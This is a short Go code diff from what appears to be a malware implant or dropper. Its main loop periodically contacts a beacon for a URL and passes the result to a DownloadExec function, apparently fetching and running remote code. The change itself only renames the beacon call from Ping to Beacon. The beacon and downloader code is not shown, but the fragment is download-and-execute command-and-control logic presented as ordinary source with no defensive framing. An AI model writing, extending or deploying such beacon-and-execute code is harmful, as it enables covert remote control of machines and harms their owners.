@@ -23,7 +23,7 @@ func main() {
 
 	for {
 		if checkIn.Before(time.Now()) {
-			url := beacon.Ping()
+			url := beacon.Beacon()
 
 			if url != "" {
 				downloader.DownloadExec(url)
